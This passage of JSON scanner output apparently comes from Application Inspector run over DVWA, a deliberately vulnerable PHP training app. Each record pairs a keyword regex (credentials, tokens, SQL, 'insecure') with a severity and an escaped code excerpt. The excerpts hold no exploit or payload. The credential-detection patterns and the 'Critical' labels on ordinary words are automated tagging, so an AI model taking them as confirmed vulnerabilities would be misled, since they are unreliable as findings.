        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: SQL Injection (Blind)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;sqli_blind&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;sqli_blind&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/index.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT COUNT(*) FROM users;&quot;;",
        "excerpt": "\t\t\t\tUser ID:&quot;;\n\tif( $vulnerabilityFile == &#39;medium.php&#39; ) {\n\t\t$page[ &#39;body&#39; ] .= &quot;\\n\t\t\t\t&lt;select name=\\&quot;id\\&quot;&gt;&quot;;\n\t\t$query  = &quot;SELECT COUNT(*) FROM users;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\t\t$num    = mysqli_fetch_row( $result )[0];\n\t\t$i      = 0;\n\t\twhile( $i &lt; $num ) { $i++; $page[ &#39;body&#39; ] .= &quot;&lt;option value=\\&quot;{$i}\\&quot;&gt;{$i}&lt;/option&gt;&quot;; }\n\t\t$page[ &#39;body&#39; ] .= &quot;&lt;/select&gt;&quot;;\n",
        "startLocationLine": 63,
        "startLocationColumn": 13,
        "endLocationLine": 63,
        "endLocationColumn": 44
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/index.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/SQL_injection&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/Blind_SQL_Injection&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://bobby-tables.com/&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n&lt;/div&gt;\\n&quot;;\n\n",
        "startLocationLine": 91,
        "startLocationColumn": 87,
        "endLocationLine": 91,
        "endLocationColumn": 92
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/file2.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t&lt;div class=\\&quot;vulnerable_code_area\\&quot;&gt;\n\t\t&lt;h3&gt;File 2&lt;/h3&gt;\n\t\t&lt;hr /&gt;\n\t\t\\&quot;&lt;em&gt;I needed a password eight characters long so I picked Snow White and the Seven Dwarves.&lt;/em&gt;\\&quot; ~ Nick Helm&lt;br /&gt;&lt;br /&gt;\n\t\t[&lt;em&gt;&lt;a href=\\&quot;?page=include.php\\&quot;&gt;back&lt;/a&gt;&lt;/em&gt;]\t&lt;/div&gt;\n\n\t&lt;h2&gt;More info&lt;/h2&gt;\n\t&lt;ul&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/Remote_File_Inclusion&#39; ) . &quot;&lt;/li&gt;\n",
        "startLocationLine": 9,
        "startLocationColumn": 20,
        "endLocationLine": 9,
        "endLocationColumn": 28
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/file2.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t&lt;div class=\\&quot;vulnerable_code_area\\&quot;&gt;\n\t\t&lt;h3&gt;File 2&lt;/h3&gt;\n\t\t&lt;hr /&gt;\n\t\t\\&quot;&lt;em&gt;I needed a password eight characters long so I picked Snow White and the Seven Dwarves.&lt;/em&gt;\\&quot; ~ Nick Helm&lt;br /&gt;&lt;br /&gt;\n\t\t[&lt;em&gt;&lt;a href=\\&quot;?page=include.php\\&quot;&gt;back&lt;/a&gt;&lt;/em&gt;]\t&lt;/div&gt;\n\n\t&lt;h2&gt;More info&lt;/h2&gt;\n\t&lt;ul&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/Remote_File_Inclusion&#39; ) . &quot;&lt;/li&gt;\n",
        "startLocationLine": 9,
        "startLocationColumn": 20,
        "endLocationLine": 9,
        "endLocationColumn": 28
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: File Inclusion&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;fi&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;fi&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Command Injection&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;exec&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;exec&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/xss_s/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Stored Cross Site Scripting (XSS)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;xss_s&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;xss_s&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/xss_d/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: DOM Based Cross Site Scripting (XSS)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;xss_d&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;xss_d&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Weak Session IDs&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;weak_id&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;weak_id&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/session-input.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] = &#39;SQL Injection Session Input&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\nif( isset( $_POST[ &#39;id&#39; ] ) ) {\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: SQL Injection&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;sqli&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;sqli&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/index.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/SQL_injection&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/SQL_Injection&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://bobby-tables.com/&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n&lt;/div&gt;\\n&quot;;\n\n",
        "startLocationLine": 88,
        "startLocationColumn": 87,
        "endLocationLine": 88,
        "endLocationColumn": 92
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csp/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Content Security Policy (CSP) Bypass&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;csp&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;csp&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csp/index.php",
        "ruleId": "AI003800",
        "ruleName": "Social Media: Twitter",
        "ruleDescription": "Social Media (Twitter)",
        "pattern": "\\b(twitter)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.SocialMedia.Twitter"
        ],
        "sample": "twitter",
        "excerpt": "\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&#39;, &quot;Mozilla Developer Network - CSP: script-src&quot;) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://blog.mozilla.org/security/2014/10/04/csp-for-the-web-we-have/&#39;, &quot;Mozilla Security Blog - CSP for the web we have&quot; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\t&lt;p&gt;&lt;i&gt;Module developed by &lt;a href=&#39;https://twitter.com/digininja&#39;&gt;Digininja&lt;/a&gt;.&lt;/i&gt;&lt;/p&gt;\n&lt;/div&gt;\\n&quot;;\n\ndvwaHtmlEcho( $page );\n\n?&gt;\n",
        "startLocationLine": 52,
        "startLocationColumn": 45,
        "endLocationLine": 52,
        "endLocationColumn": 52
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/xss_r/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Reflected Cross Site Scripting (XSS)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;xss_r&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;xss_r&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Insecure",
        "excerpt": "dvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Insecure CAPTCHA&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;captcha&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;captcha&#39;;\n$page[ &#39;source_button&#39; ] = &#39;captcha&#39;;\n\ndvwaDatabaseConnect();\n",
        "startLocationLine": 10,
        "startLocationColumn": 38,
        "endLocationLine": 10,
        "endLocationColumn": 46
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Insecure",
        "excerpt": "\n$page[ &#39;body&#39; ] .= &quot;\n\t&lt;div class=\\&quot;body_padded\\&quot;&gt;\n\t&lt;h1&gt;Vulnerability: Insecure CAPTCHA&lt;/h1&gt;\n\n\t{$WarningHtml}\n\n\t&lt;div class=\\&quot;vulnerable_code_area\\&quot;&gt;\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot; &quot;;\n",
        "startLocationLine": 46,
        "startLocationColumn": 21,
        "endLocationLine": 46,
        "endLocationColumn": 29
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI039100",
        "ruleName": "Authentication: Oauth",
        "ruleDescription": "Authentication: Oauth",
        "pattern": "\\b(auth.?token|access.?token|client.?credentials|client.?id|client.?secret|api.?key)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.Oauth"
        ],
        "sample": "API key",
        "excerpt": "// Check if we have a reCAPTCHA key\n$WarningHtml = &#39;&#39;;\nif( $_DVWA[ &#39;recaptcha_public_key&#39; ] == &quot;&quot; ) {\n\t$WarningHtml = &quot;&lt;div class=\\&quot;warning\\&quot;&gt;&lt;em&gt;reCAPTCHA API key missing&lt;/em&gt; from config file: &quot; . realpath( getcwd() . DIRECTORY_SEPARATOR . DVWA_WEB_PAGE_TO_ROOT . &quot;config&quot; . DIRECTORY_SEPARATOR . &quot;config.inc.php&quot; ) . &quot;&lt;/div&gt;&quot;;\n\t$html = &quot;&lt;em&gt;Please register for a key&lt;/em&gt; from reCAPTCHA: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.google.com/recaptcha/admin/create&#39; );\n\t$hide_form = true;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\n",
        "startLocationLine": 39,
        "startLocationColumn": 55,
        "endLocationLine": 39,
        "endLocationColumn": 62
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "require_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &quot;external/recaptcha/recaptchalib.php&quot;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Insecure CAPTCHA&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;captcha&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;captcha&#39;;\n",
        "startLocationLine": 7,
        "startLocationColumn": 26,
        "endLocationLine": 7,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$page[ &#39;body&#39; ] .= &quot;style=\\&quot;display:none;\\&quot;&quot;;\n\n$page[ &#39;body&#39; ] .= &quot;&gt;\n\t\t\t&lt;h3&gt;Change your password:&lt;/h3&gt;\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;1\\&quot; /&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n",
        "startLocationLine": 57,
        "startLocationColumn": 20,
        "endLocationLine": 57,
        "endLocationColumn": 28
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\nif( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n\t$page[ &#39;body&#39; ] .= &quot;\n\t\t\tCurrent password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n",
        "startLocationLine": 64,
        "startLocationColumn": 12,
        "endLocationLine": 64,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
